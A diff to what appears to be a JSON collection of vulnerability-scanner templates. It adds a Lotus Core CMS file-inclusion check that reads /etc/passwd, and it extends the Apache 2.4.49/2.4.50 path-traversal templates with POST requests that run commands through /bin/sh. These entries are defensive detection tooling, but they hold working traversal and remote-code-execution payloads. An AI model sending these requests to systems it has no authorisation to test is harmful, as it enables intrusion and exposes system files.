@@ -28298,6 +28298,49 @@
       ]
     },
     {
+      "id": "CVE-2020-8641",
+      "info": {
+        "author": "0x_Akoko",
+        "classification": {
+          "cve-id": "CVE-2020-8641",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+          "cvss-score": 8.8,
+          "cwe-id": "CWE-22"
+        },
+        "description": "Lotus Core CMS 1.0.1 allows authenticated Local File Inclusion of .php files via directory traversal in the index.php page_slug parameter.",
+        "name": "Lotus Core CMS 1.0.1 - Local File Inclusion",
+        "reference": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2020-8641",
+          "https://cxsecurity.com/issue/WLB-2020010234"
+        ],
+        "severity": "high",
+        "tags": "cve,cve202,lfi,lotus"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?page_slug=../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-8771",
       "info": {
         "author": "princechaddha",
@@ -36159,36 +36202,39 @@
       "info": {
         "author": "daffainfo",
         "description": "A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by \"require all denied\" these requests can succeed. Additionally this flaw could leak the source of interpreted files like CGI scripts. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions.",
-        "name": "Apache 2.4.49 - Path Traversal",
+        "name": "Apache 2.4.49 - Path Traversal and Remote Code Execution",
         "reference": [
           "https://github.com/apache/httpd/commit/e150697086e70c552b2588f369f2d17815cb1782",
           "https://nvd.nist.gov/vuln/detail/CVE-2021-41773",
           "https://twitter.com/ptswarm/status/1445376079548624899",
-          "https://twitter.com/h4x0r_dz/status/1445401960371429381"
+          "https://twitter.com/h4x0r_dz/status/1445401960371429381",
+          "https://github.com/blasty/CVE-2021-41773"
         ],
-        "severity": "high",
-        "tags": "cve,cve2021,lfi,apache,misconfig"
+        "severity": "critical",
+        "tags": "cve,cve2021,lfi,rce,apache,misconfig"
       },
       "requests": [
         {
           "matchers": [
             {
+              "name": "LFI",
               "regex": [
                 "root:.*:0:0"
               ],
               "type": "regex"
             },
             {
-              "status": [
-                200
-              ],
-              "type": "status"
+              "name": "RCE",
+              "type": "word",
+              "words": [
+                "CVE-2021-41773"
+              ]
             }
           ],
-          "matchers-condition": "and",
-          "method": "GET",
-          "path": [
-            "{{BaseURL}}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+          "matchers-condition": "or",
+          "raw": [
+            "GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\necho Content-Type: text/plain; echo; echo 37714-1202-EVC | rev\n"
           ]
         }
       ]
@@ -36294,7 +36340,7 @@
     {
       "id": "CVE-2021-42013",
       "info": {
-        "author": "nvn1729",
+        "author": "nvn1729,0xd0ff9",
         "description": "A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49 and 2.4.50. An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by \"require all denied\" these requests can succeed. Additionally this flaw could leak the source of interpreted files like CGI scripts. In certain configurations, for instance if mod_cgi is enabled, this flaw can lead to remote code execution. This issue only affects Apache 2.4.49 and 2.4.50 and not earlier versions. Note - CVE-2021-42013 is due to an incomplete fix for the original vulnerability CVE-2021-41773.",
         "name": "Apache 2.4.49/2.4.50 - Path Traversal and Remote Code Execution",
         "reference": [
@@ -36309,21 +36355,24 @@
         {
           "matchers": [
             {
+              "name": "LFI",
               "regex": [
                 "root:.*:0:0"
               ],
               "type": "regex"
             },
             {
-              "status": [
-                200
-              ],
-              "type": "status"
+              "name": "RCE",
+              "type": "word",
+              "words": [
+                "CVE-2021-42013"
+              ]
             }
           ],
-          "matchers-condition": "and",
+          "matchers-condition": "or",
           "raw": [
-            "GET /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\n\n"
+            "GET /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\n\n",
+            "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nContent-Type: application/x-www-form-urlencoded\n\necho Content-Type: text/plain; echo; echo 31024-1202-EVC | rev\n\n"
           ],
           "unsafe": true
         }
